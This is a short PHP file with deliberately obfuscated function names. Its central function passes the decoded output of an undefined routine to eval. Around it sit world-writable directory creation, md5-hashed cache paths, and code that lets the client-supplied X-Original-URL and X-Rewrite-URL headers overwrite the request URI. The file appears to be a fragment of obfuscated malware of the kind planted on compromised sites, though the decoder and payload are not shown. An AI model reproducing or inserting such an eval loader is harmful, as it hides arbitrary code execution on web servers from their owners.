<?php
function Oo00o0O0o($v_363, $v_364){
    return eval(Oo00oOO0o($v_363, $v_364));
}
function mkdirs($v_314, $v_315 = 0777){
    global $var_1;
    if (is_dir($v_314)) return true;
    mkdir($v_314, $v_315, true);
}
function getHashDir($v_364, $v_365 = 2){
    global $var_1;
    $var_366 = array();
    $var_367 = str_split(md5($v_364), 2);
    for($var_318 = "0";$var_318 < $v_365;$var_318++){
        $var_366[] = $var_367[$var_318];
    }
    $v_298 = str_replace('\\', '/', implode(DIRECTORY_SEPARATOR, $var_366));
    return $v_298;
}
if (isset($_SERVER["HTTP_X_ORIGINAL_URL"])){
    $_SERVER["REQUEST_URI"] = $_SERVER["HTTP_X_ORIGINAL_URL"];
}
if (isset($_SERVER["HTTP_X_REWRITE_URL"])){
    $_SERVER["REQUEST_URI"] = $_SERVER["HTTP_X_REWRITE_URL"];
}
?>